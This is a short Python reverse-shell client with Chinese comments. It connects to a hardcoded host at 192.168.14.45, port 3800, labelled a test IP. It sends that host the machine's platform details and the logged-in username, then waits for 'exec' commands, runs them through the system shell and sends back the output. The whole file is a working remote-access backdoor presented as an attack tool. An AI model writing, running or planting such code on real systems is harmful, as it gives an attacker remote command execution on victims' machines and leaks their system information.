# -*- coding: utf-8 -*-
import socket,subprocess as sp,sys,os,platform
 
# 连接函数
def connect():
    try:
        # host  = str(sys.argv[1])
        # port  = int(sys.argv[2])
 
        host = "192.168.14.45"   # 测试IP
        port = 3800               # 测试端口
    except Exception as e:
        sys.exit(1)
 
    conn = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    conn.connect((host,port))
 
    x_info = ""
 
    #for x in os.uname():
    for x in platform.uname():
        x_info += x + ","
 
    # 平台判断
    if platform.system() == "Linux":
        x_info += os.getlogin()  # Linux平台
    elif platform.system() == "Windows":
        x_info += os.getenv('username')  # Windows
 
    # 发送数据
    conn.send(x_info)
 
    # 会话维持
    interactive_session(conn)
    conn.close()
 
# 会话维持
def interactive_session(conn):
    while 1:
        try:
            command = str(conn.recv(1024))
        except socket.error:
            sys.exit(1)
 
        if command.split(" ")[0] == "exec":
            res = 1
            msg = ""
 
            while len(command.split(" ")) > res:
                msg += command.split(" ")[res] + " "
                res += 1
 
            sh = sp.Popen(msg,shell=True,
                          stdout= sp.PIPE,
                          stderr = sp.PIPE,
                          stdin= sp.PIPE)
            out,err = sh.communicate()
 
            result = str(out) + str(err)
 
            send_data(conn,result)
 
        elif command == "exit()":
            break
        else:
            send_data(conn,"[-] Unknown Command")
# 发送数据
def send_data(conn,data):
    length = str(len(data)).zfill(16)
    conn.send(length + data)
 
if __name__ == "__main__":
    connect()